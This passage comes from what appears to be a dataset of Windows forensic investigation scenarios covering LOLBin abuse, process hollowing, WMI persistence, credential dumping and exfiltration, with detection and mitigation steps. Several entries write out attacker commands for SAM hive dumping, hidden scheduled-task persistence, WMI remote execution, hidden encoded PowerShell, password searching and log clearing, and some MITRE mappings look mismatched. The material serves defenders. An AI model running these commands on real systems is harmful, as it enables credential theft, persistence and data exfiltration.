- **Attack Steps**: 1. Collect event logs from the suspected endpoint with Event ID 1 (Sysmon). 2. Look for rundll32.exe spawning with uncommon parameters or DLLs. 3. Common misuse: rundll32.exe javascript:"\..mshtml,... or calling DLLs from temp directories. 4. Correlate execution time with lateral movement or phishing events. 5. Examine process tree to identify the parent process. 6. Use Process Hacker or Volatility to inspect memory of rundll32.exe for injected code. 7. Dump memory and check for injected shellcode signatures. 8. Search registry for persistence mechanisms using rundll32. 9. Kill malicious rundll32 instance and blacklist offending DLL. 10. Update detection rules for unusual rundll32 command lines.
- **Detection**: Detect rundll32 anomalies in command line
- **Solution**: Block rundll32 unless used by trusted apps
- **Tags**: lolbas, rundll32, sysmon, memory injection

## Investigation of Suspicious Cmd.exe Spawn

- **Attack Type**: Process Analysis
- **Target**: Windows
- **Vulnerability**: Command line misuse
- **MITRE**: T1059
- **Impact**: Malware staging or persistence
- **Tools**: Event Logs, KAPE, Procmon
- **Scenario**: Malicious payload spawns cmd.exe repeatedly for script execution or persistence
- **Attack Steps**: 1. Use KAPE to gather Event ID 4688 (process creation). 2. Look for parent processes like explorer.exe, winword.exe, or even svchost.exe launching cmd.exe. 3. Extract full command line and analyze for suspicious patterns (/c, redirection, scripts from temp path). 4. Cross-reference command time with user login sessions. 5. Use Procmon to observe any further processes spawned by cmd.exe. 6. Trace back to delivery mechanism—likely a document or script file. 7. Kill ongoing suspicious cmd.exe processes and isolate the affected user account. 8. Inspect prefetch for cmd.exe execution frequency. 9. Check autoruns for scheduled tasks or registry entries referencing cmd. 10. Develop behavioral rule for abnormal cmd.exe parent-child patterns.
- **Detection**: Event log triage, parent-child relationship
- **Solution**: Restrict scripting engines and log cmd usage
- **Tags**: command line, cmd, scripting, abuse

## Process Hollowing Detection via Volatility

- **Attack Type**: Process Analysis
- **Target**: Windows RAM
- **Vulnerability**: Code injection
- **MITRE**: T1055.012
- **Impact**: Covert malware execution
- **Tools**: Volatility, KAPE, Malfind Plugin
- **Scenario**: Attacker injects malicious code into legitimate process memory using process hollowing
- **Attack Steps**: 1. Acquire memory image using DumpIt or WinPMEM. 2. Load the image into Volatility. 3. Run pslist and pstree to view processes. 4. Identify inconsistencies in parent-child relationships or suspicious process names. 5. Use malfind plugin to scan for injected code. 6. Examine memory regions marked as executable and writable. 7. Dump suspicious memory segments using memdump. 8. Analyze dumped code with a disassembler or Yara rules. 9. Cross-check image path and command line for signs of tampering. 10. Document the hollowed process for reporting and IOC creation.
- **Detection**: Memory analysis with Volatility
- **Solution**: Use AppLocker, audit memory regions
- **Tags**: process hollowing, volatility, injection

## Investigation of Rare Command Line Switches

- **Attack Type**: Command Line Analysis
- **Target**: Windows
- **Vulnerability**: Misuse of built-in tools
- **MITRE**: T1202
- **Impact**: Evasion of detection
- **Tools**: Sigma, Sysmon, PowerShell Logs
- **Scenario**: Attackers use uncommon flags in built-in utilities to evade detection
- **Attack Steps**: 1. Review process creation logs (Sysmon 1 or 4688). 2. Extract command lines for tools like reg.exe, xcopy, bitsadmin, powershell. 3. Identify rare flags or combinations not commonly used by admins. 4. Example: reg.exe delete HKCU\Software\... /f or bitsadmin /transfer .... 5. Use Sigma rules or grep to find occurrences across multiple hosts. 6. Trace back usage to account and system. 7. Validate if it aligns with documented use cases. 8. Alert if unknown users or machines are involved. 9. Educate blue team on rare flag behavior. 10. Update detection rules to include rare switch combos.
- **Detection**: Command line frequency analysis
- **Solution**: Harden script usage policies
- **Tags**: rare flags, reg, bitsadmin, powershell

## WMIC Lateral Movement Discovery

- **Attack Type**: Command Line & WMI Analysis
- **Target**: Domain Systems
- **Vulnerability**: WMI lateral movement
- **MITRE**: T1047
- **Impact**: Network-wide command execution
- **Tools**: Event Logs, Sysmon, Firewall Logs
- **Scenario**: WMIC is used to launch commands on remote machines in domain environments
- **Attack Steps**: 1. Analyze logs from systems with suspicious activity. 2. Focus on Event ID 4688 and Sysmon ID 3 (network connection). 3. Look for wmic process call create ... launching suspicious payloads. 4. Identify originating user and source machine. 5. Match timestamps with lateral movement or beaconing. 6. Search registry for command execution artifacts. 7. Validate access levels and logon type. 8. Use firewall logs to map remote connections. 9. Alert and isolate source host. 10. Implement controls to restrict WMIC execution.
- **Detection**: Detect wmic.exe usage across endpoints
- **Solution**: Disable WMIC if unnecessary
- **Tags**: wmic, remote, lateral, process create

## Beaconing via Scripted PowerShell Loop

- **Attack Type**: Command Line Analysis
- **Target**: Windows
- **Vulnerability**: Scripted persistence
- **MITRE**: T1071
- **Impact**: Command & Control
- **Tools**: Event Logs, Sysmon, PowerShell Logs
- **Scenario**: Adversary creates a PowerShell loop to ping C2 server regularly
- **Attack Steps**: 1. Investigate PowerShell logs for repeated script activity. 2. Look for looping behavior (while, for, sleep) in script block logs. 3. Cross-reference timestamps with external traffic. 4. Identify hardcoded IPs or domains in the loop. 5. Use Sysmon to track spawned processes or downloads. 6. Correlate with firewall or DNS logs for outbound traffic. 7. Terminate script execution and quarantine system. 8. Reverse-engineer the payload, if downloaded. 9. Report indicators to threat intel teams. 10. Create detection rule for beaconing script pattern.
- **Detection**: Beaconing pattern detection
- **Solution**: Block script loops, detect long-lived shells
- **Tags**: beaconing, powershell, script loop

## Registry Analysis for Malicious CLI Persistence

- **Attack Type**: Command Line Analysis
- **Target**: Windows
- **Vulnerability**: Registry persistence
- **MITRE**: T1547.001
- **Impact**: Persistence via system boot
- **Tools**: Registry Explorer, Autoruns, Event Logs
- **Scenario**: Attackers use registry keys (Run, Image File Execution) to maintain CLI persistence
- **Attack Steps**: 1. Load suspect registry hives using Registry Explorer or RECmd. 2. Check keys like HKCU\Software\Microsoft\Windows\CurrentVersion\Run. 3. Identify values pointing to scripts or CLIs in temp folders. 4. Look for Image File Execution Options being abused with Debugger. 5. Correlate with process creation logs for validation. 6. Compare timestamps of key creation and activity. 7. Check binary hash for reputation. 8. Remove malicious keys and alert SOC. 9. Hunt similar registry keys enterprise-wide. 10. Build detection rule based on abused registry paths.
- **Detection**: Registry monitoring & Autoruns
- **Solution**: Harden startup folder and registry
- **Tags**: registry, run key, persistence

## Investigation of Process Doppelgänging

- **Attack Type**: Process Analysis
- **Target**: Windows
- **Vulnerability**: Fileless execution
- **MITRE**: T1055.013
- **Impact**: Advanced fileless malware
- **Tools**: Volatility, Rekall, Memory Dump
- **Scenario**: Malware executes using NTFS transactions and avoids writing to disk
- **Attack Steps**: 1. Capture full memory dump using WinPMEM or DumpIt. 2. Load into Volatility and use psscan to identify hidden processes. 3. Cross-verify with pslist and dlllist. 4. Use malfind to search for hollowed/injected memory. 5. Check for processes with no command line or path. 6. Examine NTFS transaction artifacts using Rekall plugins. 7. Dump memory segments for deeper analysis. 8. Check for mismatched digital signatures or empty process names. 9. Use Sigma/Yara rules to hunt across memory dumps. 10. Alert IR team and begin IOC triage.
- **Detection**: Memory scanning, signature mismatch
- **Solution**: Disable NTFS transactional APIs
- **Tags**: process doppelgänging, fileless, memory

## Detect Word to PowerShell Process Chain

- **Attack Type**: Suspicious Process Tree
- **Target**: Windows System
- **Vulnerability**: Lack of parent-child monitoring in Word macros
- **MITRE**: T1059.001 – PowerShell
- **Impact**: Remote code execution, lateral movement
- **Tools**: Volatility, Process Hacker
- **Scenario**: Investigating a suspicious child process (PowerShell) spawned by Microsoft Word
- **Attack Steps**: 1. Load memory dump into Volatility.2. Use pslist or pstree to find winword.exe.3. Look for child processes linked to PowerShell.4. Identify full command line using cmdline.5. Use handles plugin to see file or network activity.6. Check timeline for execution patterns.7. Cross-verify with EDR or Sysmon logs.
- **Detection**: Sysmon Event ID 1, Volatility pstree or cmdline plugins
- **Solution**: Implement macro restrictions, monitor child process spawns
- **Tags**: Word, PowerShell, Volatility, Process Hacker

## Process Hollowing via Suspicious svchost.exe

- **Attack Type**: Process Hollowing
- **Target**: Windows System
- **Vulnerability**: Lack of memory inspection
- **MITRE**: T1055 – Process Injection
- **Impact**: Stealthy persistence, AV evasion
- **Tools**: Volatility, Process Hacker
- **Scenario**: Malware hides inside legitimate svchost.exe via code injection
- **Attack Steps**: 1. Analyze memory image with Volatility.2. Run malfind to find injected regions.3. Identify abnormal memory protections (RWX) in svchost.exe.4. Use ldrmodules to check for missing/injected DLLs.5. Compare PE headers with loaded memory.6. Review startup entries.7. Isolate svchost and extract dump for reverse analysis.
- **Detection**: malfind, Process Hacker inspection of threads/modules
- **Solution**: Block unsigned DLLs, enforce signed code policies
- **Tags**: Hollowing, svchost, Volatility, Injection

## Chrome.exe Running from Temp Folder

- **Attack Type**: Rogue Execution Location
- **Target**: Windows System
- **Vulnerability**: Fake binary paths bypass allowlists
- **MITRE**: T1036.005 – Masquerading
- **Impact**: User data theft, persistence
- **Tools**: Process Explorer, Volatility
- **Scenario**: Chrome appears to run from unusual path like %TEMP% indicating impersonation
- **Attack Steps**: 1. Identify abnormal process location using Process Explorer.2. Search memory image using Volatility psscan.3. Use cmdline to inspect command line args.4. Dump process with suspicious path.5. Use VirusTotal to scan the dumped file.6. Cross-check process creation time.7. Review parent process lineage.
- **Detection**: File path heuristics, parent process ID checking
- **Solution**: Implement allowlists, block execution from Temp directories
- **Tags**: Chrome, masquerade, rogue process

## Word Macro Spawns WMI Host

- **Attack Type**: WMI-based Execution
- **Target**: Windows System
- **Vulnerability**: Macro to WMI stealth execution path
- **MITRE**: T1047 – Windows Management
- **Impact**: Code execution via stealthy mechanism
- **Tools**: Process Hacker, Sysmon
- **Scenario**: Word document executes payload using WMI host to bypass detection
- **Attack Steps**: 1. Start investigation via EDR alert or suspicious Word behavior.2. Use Process Hacker to trace parent-child chain.3. Identify wmiprvse.exe as unexpected child.4. Review commandline for wmic process call or similar.5. Correlate execution time with Word.6. Extract macro code using olevba.7. Dump WMI activity logs.
- **Detection**: EDR alerts, Windows WMI logs, Process chain correlation
- **Solution**: Block macros, monitor WMI command usage
- **Tags**: WMI, Macro, Word, DFIR

## Detect Rundll32 DLL Sideloading

- **Attack Type**: DLL Sideloading
- **Target**: Windows System
- **Vulnerability**: Untrusted DLL paths not blocked
- **MITRE**: T1218.011 – Rundll32 abuse
- **Impact**: Code execution under trusted binary
- **Tools**: Volatility, PEStudio
- **Scenario**: Attackers abuse rundll32.exe to sideload malicious DLLs with legitimate names
- **Attack Steps**: 1. Dump memory image from infected system.2. Locate rundll32.exe processes using pslist.3. Use cmdline to extract DLL path.4. Validate DLL signature and path.5. Analyze DLL using PEStudio for anomalies.6. Search system for unexpected DLLs.7. Isolate and reverse malicious DLL.
- **Detection**: Command line args, DLL load trace from memory
- **Solution**: Enable DLL loading restrictions via AppLocker
- **Tags**: rundll32, sideloading, DLL abuse

## Suspicious Parent: Excel Spawns Cmd

- **Attack Type**: Suspicious Parent Process
- **Target**: Windows System
- **Vulnerability**: Unsanitized macro in Excel
- **MITRE**: T1203 – Exploitation for Exec
- **Impact**: Initial foothold or payload delivery
- **Tools**: Process Hacker, Sysmon
- **Scenario**: Excel unexpectedly spawns a command shell, indicating possible macro or exploit
- **Attack Steps**: 1. Detect suspicious behavior via EDR.2. Use Process Hacker to trace Excel spawning cmd.exe.3. Check command-line for indicators.4. Dump process memory.5. Correlate with user activity/logon session.6. Scan macros in Excel using olevba.7. Verify network or file activity triggered by command.
- **Detection**: Sysmon logs, process tree correlation
- **Solution**: Disable Office macros by default
- **Tags**: Excel, cmd, macro, suspicious spawn

## Explorer.exe with No Parent Process

- **Attack Type**: Orphan Process
- **Target**: Windows System
- **Vulnerability**: Manual attacker execution outside GUI session
- **MITRE**: T1055.012 – Process Hollowing
- **Impact**: Untracked lateral movement
- **Tools**: Volatility, EDR, KAPE
- **Scenario**: explorer.exe found running without a parent session, possibly launched manually
- **Attack Steps**: 1. Review user sessions from memory using Volatility.2. Identify explorer.exe with no valid parent using pstree.3. Check creation timestamp.4. Compare against logon events.5. Inspect command line and loaded modules.6. Use cmdscan to analyze shell history.7. Investigate any network activity initiated.
- **Detection**: Session mismatch in logs, orphaned process trees
- **Solution**: Tie process to valid user sessions
- **Tags**: Explorer.exe, orphan process, stealth movement

## Detect Process Injection via Regsvr32

- **Attack Type**: Living Off The Land (LOLBin)
- **Target**: Windows System
- **Vulnerability**: Use of trusted binary for injection
- **MITRE**: T1218.010 – Regsvr32 Abuse
- **Impact**: AV evasion, persistence
- **Tools**: Volatility, Sysmon, PEStudio
- **Scenario**: Use of regsvr32.exe to load and inject malicious code into memory
- **Attack Steps**: 1. Use pslist in Volatility to locate regsvr32.exe.2. Use malfind to identify injected code regions.3. Analyze memory protections.4. Correlate execution timestamp with dropper.5. Examine loaded DLLs.6. Cross-reference with Sysmon Event ID 7 (Image Loaded).7. Dump and reverse malicious DLL.
- **Detection**: Sysmon logs, memory analysis with malfind
- **Solution**: Block LOLBins with AppLocker or WDAC
- **Tags**: regsvr32, injection, LOLBin abuse

## Unsigned Binary Spawns System Tools

- **Attack Type**: Suspicious Binary Behavior
- **Target**: Windows System
- **Vulnerability**: Unsigned execution without alerting
- **MITRE**: T1059 – Command Execution
- **Impact**: Discovery, recon, staging
- **Tools**: EDR, Process Monitor
- **Scenario**: Unknown binary runs and spawns tools like ipconfig, netstat, etc.
- **Attack Steps**: 1. Detect unknown binary execution alert.2. Trace spawned processes using Process Monitor.3. Extract full command line of children.4. Compare hash of binary with known signatures.5. Check PE headers.6. Isolate file and analyze in sandbox.7. Review user context of execution.
- **Detection**: Process creation chains, execution metadata
- **Solution**: Block unsigned binaries, monitor behavioral chains
- **Tags**: Recon, unsigned binary, ipconfig, netstat

## Svchost Spawns RDP with No User Activity

- **Attack Type**: Unattended RDP Spawn
- **Target**: Windows System
- **Vulnerability**: Abuse of service host to launch remote tools
- **MITRE**: T1021.001 – Remote Services
- **Impact**: Covert access, remote persistence
- **Tools**: Volatility, Windows Event Logs
- **Scenario**: svchost.exe launches RDP connection outside of logged-in hours
- **Attack Steps**: 1. Use Volatility to identify svchost.exe processes.2. Check command line for RDP-related flags.3. Correlate time with login/logoff records.4. Inspect session data for active users.5. Review Event ID 4624 and 4778 for interactive login.6. Check network logs for outbound RDP.7. Raise alert and isolate.
- **Detection**: RDP logs, event correlation, anomaly detection
- **Solution**: Block RDP usage from system accounts
- **Tags**: svchost, RDP abuse, login anomaly

## Recon via whoami and net user

- **Attack Type**: Reconnaissance
- **Target**: Workstation
- **Vulnerability**: Weak monitoring of built-in command use
- **MITRE**: T1033 – System Owner/User Discovery
- **Impact**: Credential insight, lateral movement planning
- **Tools**: Command Prompt, Event Logs
- **Scenario**: Attacker uses basic command-line tools to understand user privileges and local accounts.
- **Attack Steps**: 1. Attacker launches Command Prompt or executes shell commands via a dropper or C2 channel.2. Runs whoami /all to enumerate the logged-in user, associated groups, and privileges.3. Uses net user and net localgroup administrators to inspect local user accounts and administrative access.4. The output is either logged or exfiltrated.5. These commands leave traces in event logs, prefetch, and potentially registry keys indicating recent command execution.
- **Detection**: Event ID 4688, Prefetch inspection, Registry MRU tracking
- **Solution**: Enable logging for shell activity, alert on suspicious enumeration
- **Tags**: reconnaissance, privilege hunting, net user

## Lateral Discovery using wmic queries

- **Attack Type**: Reconnaissance
- **Target**: Windows Server
- **Vulnerability**: WMI exposure, lack of logging
- **MITRE**: T1047 – Windows Management Instrumentation
- **Impact**: Target mapping, vulnerable host identification
- **Tools**: WMIC, Event Logs, Sysmon
- **Scenario**: Attacker uses WMIC to list remote systems, processes, and user sessions across the domain.
- **Attack Steps**: 1. Attacker obtains valid credentials or already has local access.2. Executes wmic /node:<hostname> process list brief to query running processes remotely.3. Also runs wmic /node:<hostname> computersystem get username to check logged-in users.4. Uses wmic qfe list to detect patch levels and vulnerable systems.5. The WMI provider logs this behavior and can be tracked via Event ID 5861 or Sysmon.6. Output is sent back via clipboard, temporary file, or C2 channel.
- **Detection**: WMI-Activity logs, Sysmon Event ID 1, 3
- **Solution**: Restrict WMI access, enable granular WMI logging
- **Tags**: wmic, T1047, lateral recon

## Credential Dumping via cmd + reg.exe

- **Attack Type**: Credential Access
- **Target**: Windows Host
- **Vulnerability**: Inadequate access controls, missing alerts on hive dump
- **MITRE**: T1003.002 – OS Credential Dumping: Security Account Manager
- **Impact**: Full NTLM hash dump
- **Tools**: Command Prompt, reg.exe, KAPE, Volatility
- **Scenario**: Uses registry command-line access to extract SAM, SYSTEM, and SECURITY hives.
- **Attack Steps**: 1. Attacker gains admin or SYSTEM-level access via privilege escalation.2. Executes reg save HKLM\SAM sam.hive, reg save HKLM\SYSTEM system.hive, and reg save HKLM\SECURITY security.hive from an elevated command prompt.3. These registry hives are dumped to disk and may be exfiltrated.4. Hive files are later processed using tools like Mimikatz or secretsdump.py.5. This leaves logs in event logs and may appear in prefetch.6. DFIR investigators may correlate CMD usage and file creation timestamps.
- **Detection**: Sysmon for reg.exe (Event ID 1), file write analysis, KAPE triage
- **Solution**: Enable LSASS protection, monitor reg save usage
- **Tags**: registry dump, credential theft

## Silent Persistence via Scheduled Task via CMD

- **Attack Type**: Persistence
- **Target**: Workstation
- **Vulnerability**: Weak task creation monitoring
- **MITRE**: T1053.005 – Scheduled Task/Job: Scheduled Task
- **Impact**: Persistence after reboot
- **Tools**: schtasks.exe, Event Logs, Autoruns
- **Scenario**: Creates scheduled tasks to run payloads during user logon or system boot via CLI.
- **Attack Steps**: 1. Attacker prepares a malicious binary or script stored in a hidden directory.2. Executes schtasks /create /tn "OneDriveUpdate" /tr "C:\hidden\payload.exe" /sc onlogon /rl highest.3. The task masquerades as a system update.4. Task creation is logged under Event ID 4698 and visible via schtasks /query.5. The attacker may delete the logs using wevtutil to hide traces.6. Persistence is triggered every user login.7. Investigators trace back suspicious task names or creation times.
- **Detection**: Event ID 4698, KAPE’s Scheduled Tasks parser
- **Solution**: Monitor task creation events, restrict user task creation
- **Tags**: persistence, schtasks, logon trigger

## Data Collection using dir, type, findstr

- **Attack Type**: Collection
- **Target**: Workstation
- **Vulnerability**: Lack of DLP, audit evasion via native tools
- **MITRE**: T1005 – Data from Local System
- **Impact**: Sensitive data collection, privacy breach
- **Tools**: CMD, findstr, dir
- **Scenario**: Attacker uses native commands to search for and read sensitive documents.
- **Attack Steps**: 1. After gaining access, attacker uses dir /s /b *password* or dir /s /b *.xls to locate likely credential or financial files.2. Runs findstr /si password *.txt to extract matching lines.3. Uses type or more to read file content.4. Output may be saved or piped to files for exfil.5. All actions remain native and fileless.6. DFIR can detect through command-line logging or shellbag analysis.
- **Detection**: Event ID 4688 with command-line auditing, shellbag timeline
- **Solution**: Enable command-line logging, use DLP
- **Tags**: findstr, password harvesting, local data

## Execution via WMI and Embedded VBScript

- **Attack Type**: Execution
- **Target**: Windows Server
- **Vulnerability**: WMI execution abuse
- **MITRE**: T1047, T1059.005 – WMI + VBScript
- **Impact**: Remote payload execution
- **Tools**: wmic, Windows Script Host
- **Scenario**: Attacker uses WMI command-line to execute VBScript or hidden payloads remotely.
- **Attack Steps**: 1. Attacker uploads a malicious .vbs payload on a target system.2. Executes wmic process call create "wscript.exe C:\temp\script.vbs" to launch script.3. Script may be fileless if generated dynamically via PowerShell.4. This method bypasses common detection due to WMI’s native trust.5. Traces appear in WMI logs, Sysmon process creation logs.6. DFIR analysts can link wmic.exe to abnormal script execution.
- **Detection**: Sysmon (Event ID 1, 3), WMI-Activity logs
- **Solution**: Block script hosts or limit WMI, use AMSI
- **Tags**: vbscript, wmi execution, stealthy run

## WMI Persistence via Event Filters

- **Attack Type**: Persistence
- **Target**: Enterprise System
- **Vulnerability**: Lack of WMI auditing
- **MITRE**: T1546.003 – Event Triggered Execution: WMI Event Subscription
- **Impact**: Long-term stealth persistence
- **Tools**: WMI Command-line, PowerShell
- **Scenario**: Attacker creates a WMI subscription that executes payloads when a condition is met.
- **Attack Steps**: 1. Uses command-line or PowerShell to register a WMI Event Filter, Consumer, and Binding.2. Triggers execution when specific events occur (e.g., user logon).3. Command: wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter...4. Payload can be stealthy script or EXE, triggered silently.5. Persistence is deeply hidden and survives reboots.6. Detection requires parsing WMI repository or using tools like Sysinternals Autoruns.7. Often used in fileless malware attacks.
- **Detection**: WMI logs, Autoruns, KAPE registry modules
- **Solution**: Monitor WMI namespaces, use WMI Explorer for forensics
- **Tags**: stealthy persistence, WMI trigger

## Exfil via Command-line compression

- **Attack Type**: Exfiltration
- **Target**: Windows Host
- **Vulnerability**: Native tools used for stealth
- **MITRE**: T1560 – Archive Collected Data
- **Impact**: Data exfiltration in compressed format
- **Tools**: CMD, tar.exe, 7z.exe, KAPE
- **Scenario**: Attacker zips sensitive directories before transferring out.
- **Attack Steps**: 1. Attacker finds useful directories like Desktop, Documents.2. Uses native tar (Windows 10+) or 7z if available: tar -cvf data.tar C:\Users\Alice\Documents.3. Moves archive to temp location or encodes it (e.g., base64).4. Sends over HTTP, FTP, or C2.5. Prefetch entries and Event ID 4688 with command-line can reveal zip creation.6. DFIR checks large archive creation in volatile collection.
- **Detection**: Prefetch, CMD audit logs, file I/O triage
- **Solution**: Block tar/7z or alert on large archive creation
- **Tags**: exfiltration, tar, compression abuse

## Command-based Remote Access Tool Execution

- **Attack Type**: Execution
- **Target**: Windows System
- **Vulnerability**: Lack of command-line auditing
- **MITRE**: T1059 – Command and Scripting Interpreter
- **Impact**: Remote control, backdoor
- **Tools**: CMD, PowerShell, Event Logs
- **Scenario**: Executes RAT using command-line obfuscation techniques.
- **Attack Steps**: 1. Attacker drops a RAT binary into a hidden folder.2. Executes it via cmd /c "start C:\hidden\rat.exe" or powershell -w hidden -enc <payload>.3. Obfuscation helps bypass detection.4. Binary may inject itself into legitimate processes.5. DFIR traces execution via Event ID 4688 and memory analysis.6. Prefetch shows repeated launches and timestamps.
- **Detection**: Process chain analysis, command-line logging
- **Solution**: Block execution via AppLocker or Defender policies
- **Tags**: rat, cmd obfuscation

## Scheduled WMI Exfil Routine

- **Attack Type**: Exfiltration
- **Target**: Workstation
- **Vulnerability**: Hidden via nontraditional scheduling
- **MITRE**: T1020 – Automated Exfiltration
- **Impact**: Periodic data theft
- **Tools**: WMI, VBScript, Event Logs
- **Scenario**: Automates data exfil using WMI scheduled scripts.
- **Attack Steps**: 1. Attacker writes a script to collect files and store them in a hidden directory.2. Registers a WMI timer that runs script every X minutes: SetTimerInstruction = "SetTimer..."3. Uses wscript or cscript to send ZIPs via HTTP.4. Leaves very few logs unless WMI activity is traced.5. Detection is possible by correlating missing task scheduler entries and outbound traffic anomalies.6. Requires deep Windows internals for full analysis.
- **Detection**: WMI logs, network DLP, process behavior
- **Solution**: Disable scripting engines, monitor WMI timers
- **Tags**: scheduled exfil, script based theft

## Obfuscated PowerShell Loader Analysis

- **Attack Type**: Obfuscated Execution
- **Target**: Workstation
- **Vulnerability**: PowerShell Logging Disabled
- **MITRE**: T1059.001
- **Impact**: Evasion & Code Execution
- **Tools**: Sysmon, PowerShell logs, Event Viewer, CyberChef
- **Scenario**: Attacker used encoded PowerShell to bypass security tools
- **Attack Steps**: 1. Open Event Viewer and go to Applications and Services Logs → Microsoft → Windows → PowerShell → Operational. 2. Search for Event ID 4104 (script block logging). 3. Locate base64-encoded strings often used for obfuscation. 4. Copy encoded string and paste it into CyberChef. 5. Use “From Base64” and “Decode Text” to get actual payload. 6. Analyze decoded script for suspicious keywords (e.g., Invoke-Expression, IEX, download strings, etc.). 7. Correlate the decoded command with its parent process in Sysmon Event ID 1 or 4688 in Security log. 8. Check command lineage — did it spawn from winword.exe or explorer.exe? 9. Note if persistence mechanisms (registry, WMI) were installed. 10. Document and hash the decoded script for intel sharing.
- **Detection**: PowerShell 4104 + Sysmon 1/4688 correlation
- **Solution**: Enforce Script Block Logging, enable AMSI, restrict PowerShell usage via GPO
- **Tags**: powershell, obfuscation, eventlog, DFIR

## Discovery via WMIC

- **Attack Type**: Reconnaissance
- **Target**: Enterprise Network
- **Vulnerability**: WMI Command Visibility Gaps
- **MITRE**: T1047
- **Impact**: Information Gathering
- **Tools**: Event Logs, Sysmon, WMI Explorer
- **Scenario**: WMIC used for host and process enumeration without dropping binaries
- **Attack Steps**: 1. Look into Event Logs → Security Log for Event ID 4688. 2. Search command lines involving wmic process list, wmic useraccount, or wmic service get. 3. Cross-reference with Sysmon Event ID 1 for full command-line execution trace. 4. Use WMI Explorer to understand queried namespaces (e.g., root\cimv2). 5. Correlate timestamp and user with logon session activity (Event ID 4624). 6. Look for rapid bursts or repeated queries which indicate automation. 7. Check if process was launched from suspicious parent like PowerShell. 8. Investigate remote execution attempts via WMIC (e.g., wmic /node:<IP>). 9. Investigate follow-up commands or lateral activity. 10. Report WMIC usage from non-admin or service accounts as anomaly.
- **Detection**: Command Line Auditing + WMI Activity Correlation
- **Solution**: Enable full command-line logging, disable WMIC where unused
- **Tags**: wmi, wmic, recon, lateral movement, logs

## Registry-Based Command Execution

- **Attack Type**: Persistence
- **Target**: Windows Endpoint
- **Vulnerability**: Registry Autorun Keys
- **MITRE**: T1547.001
- **Impact**: Persistence
- **Tools**: Registry Explorer, Autoruns, Event Logs
- **Scenario**: Attacker stored malicious command in registry Run key
- **Attack Steps**: 1. Launch Registry Explorer and navigate to HKCU\Software\Microsoft\Windows\CurrentVersion\Run. 2. Note any unusual entries with long or obfuscated command lines. 3. Cross-verify with Sysmon Event ID 13 (registry object modifications). 4. Check which process modified the registry using Event ID 12 and 13 (Sysmon). 5. Use Autoruns to validate if the key runs at user or system startup. 6. Decode any base64 or PowerShell embedded commands. 7. Compare hash of referenced script or file with threat intel feeds. 8. Review associated user profile to determine who owns the key. 9. Validate persistence duration via Prefetch or AmCache timestamps. 10. Clean and document entry and inform SOC for detection tuning.
- **Detection**: Registry audit + Sysmon ID 13
- **Solution**: Monitor autoruns, baseline allowed Run entries
- **Tags**: registry, persistence, autoruns, powershell

## WMI Event Subscription for Persistence

- **Attack Type**: Persistence
- **Target**: Enterprise Workstation
- **Vulnerability**: WMI Persistence Not Logged by Default
- **MITRE**: T1546.003
- **Impact**: Stealthy Persistence
- **Tools**: WMI Explorer, Sysinternals Autoruns, Event Viewer
- **Scenario**: Adversary used WMI Event Filter → Consumer binding for stealthy startup
- **Attack Steps**: 1. Open WMI Explorer and browse root\subscription namespace. 2. Identify suspicious EventFilters and their associated Consumers. 3. Look for script or command execution in CommandLineEventConsumers. 4. Cross-reference with Sysmon Event ID 19, 20, and 21 (WMI activity). 5. Map who created the event binding by checking timestamps and user session. 6. Confirm execution by checking Security Log 4688 and PowerShell logs. 7. Use Autoruns to check for any residual references. 8. Validate if it's benign admin activity or attacker persistence. 9. Disable WMI consumer, back up the repository, and delete the entry. 10. Report IOCs to blue team for detection rule creation.
- **Detection**: WMI Subscription + Sysmon Event IDs
- **Solution**: Enable WMI logging + detect rogue filters
- **Tags**: wmi, persistence, event filter, dfir

## Malicious Command Hidden in Scheduled Task

- **Attack Type**: Execution
- **Target**: Windows Host
- **Vulnerability**: Task Scheduler Abuse
- **MITRE**: T1053.005
- **Impact**: Persistence / Execution
- **Tools**: Task Scheduler, Event Logs, Autoruns
- **Scenario**: Task Scheduler used to run hidden PowerShell command
- **Attack Steps**: 1. Open Task Scheduler and inspect scheduled tasks under Microsoft and root folders. 2. Sort by “Actions” to detect any unexpected commands or scripts. 3. Pay attention to commands invoking PowerShell, especially with encoded content. 4. Use Event Viewer → Microsoft → Windows → TaskScheduler → Operational logs (Event ID 106, 140, etc.). 5. Correlate Task creation logs with Event ID 4698 and 4702. 6. Decode any base64 payloads in the action. 7. Use Autoruns to check for persistence-related tasks. 8. Investigate who created the task (event log subject username). 9. Assess intent — is it backup or beaconing malware? 10. Disable and export the task for forensic archiving.
- **Detection**: Task Scheduler logs + Event ID 4698
- **Solution**: Lock down task creation, alert on encoded commands
- **Tags**: task scheduler, persistence, encoded powershell

## WMIC Lateral Movement Detection

- **Attack Type**: Lateral Movement
- **Target**: Enterprise LAN
- **Vulnerability**: WMI Authentication Misuse
- **MITRE**: T1028
- **Impact**: Remote Code Execution
- **Tools**: Windows Security Logs, Sysmon, Netmon
- **Scenario**: Attacker used wmic /node: to execute commands remotely
- **Attack Steps**: 1. Search Security Event Logs for Event ID 4624 Type 3 (network logon). 2. Look for remote logins followed by Event ID 4688 executing wmic. 3. Use Sysmon Event ID 3 to see network connections made during the period. 4. Identify lateral command patterns like wmic /node:<ip> process call create. 5. Investigate if commands executed dropped payloads or scheduled tasks. 6. Review Firewall logs for outbound SMB or RPC from non-standard machines. 7. Use Netmon/Wireshark to examine DCOM traffic if needed. 8. Verify compromised account privileges used for lateral movement. 9. Isolate affected hosts to prevent worm-like spread. 10. Document TTP and create alert for remote WMI execution.
- **Detection**: Remote login correlation + WMIC command detection
- **Solution**: Restrict DCOM + alert on remote WMI usage
- **Tags**: wmi, lateral movement, dcom, privilege abuse

## Living-Off-the-Land with cmd.exe and bitsadmin

- **Attack Type**: LOLBin Abuse
- **Target**: Endpoint
- **Vulnerability**: LOLBins Not Monitored
- **MITRE**: T1218.005
- **Impact**: Fileless Delivery
- **Tools**: Event Logs, Sysmon, Process Explorer
- **Scenario**: Attacker used native tools like cmd and bitsadmin for download & exec
- **Attack Steps**: 1. Search Sysmon Event ID 1 for bitsadmin and cmd.exe invocation. 2. Validate if arguments include download URLs or suspicious file paths. 3. Review Prefetch files for execution traces of these binaries. 4. Examine parent-child relationship — were they spawned from a doc or browser? 5. Use Event ID 4688 for process tracking of system utilities. 6. Downloaded files should be hashed and sandboxed. 7. Use DNS logs to confirm external domains contacted. 8. Check persistence methods post-download (e.g., scheduled task creation). 9. Trace user who initiated download and validate endpoint integrity. 10. Create YARA/EDR rule to catch native tool abuse.
- **Detection**: Prefetch + Event ID 4688 + Sysmon
- **Solution**: Monitor native tool usage + restrict user rights
- **Tags**: lolbins, bitsadmin, cmd.exe, download

## Rundll32 Misuse for DLL Execution
